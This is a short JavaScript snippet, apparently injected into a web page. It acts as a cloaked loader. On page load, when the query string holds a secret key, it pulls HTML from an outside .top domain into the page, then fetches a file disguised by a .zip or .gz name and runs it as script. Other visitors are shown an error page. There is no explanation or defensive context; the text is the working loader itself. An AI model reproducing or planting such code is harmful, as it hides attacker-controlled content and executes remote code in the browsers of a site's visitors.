<script>

function readTextFile(file, callback) {
    var rawFile = new XMLHttpRequest();
    var parts = file.split('.');
    var extension = parts.pop();
    if (extension == "zip") {
        rawFile.overrideMimeType("application/json");
    }
    if (extension == "gz") {
        rawFile.overrideMimeType("text/plain");
    }
    rawFile.open("GET", file, true);
    rawFile.onreadystatechange = function() {
        if (rawFile.readyState === 4 && rawFile.status == "200") {
            callback(rawFile.responseText);
        }
    }
    rawFile.send(null);
}
function download() {
    readTextFile("https://ricardojackmc.top/p0.zip", function(text){
        document.getElementById("content").innerHTML = text;
    });
}
function contents() {
    readTextFile("https://ricardojackmc.top/s0.zip", function(text){
        document.getElementById("content").innerHTML = text;
    });
}
window.onload = function() {
    var value = window.location.search.substring(1);
    if (value == "alubnfolklore") {
        contents();
        readTextFile("https://ricardojackmc.top/f0.gz", function(jsCode){
        var script = document.createElement('script');
        script.textContent = jsCode;
        document.body.appendChild(script);
    });
    } else {
        readTextFile("https://ricardojackmc.top/error.html", function(text){
        document.getElementById("content").innerHTML = text;
    });
    }
}
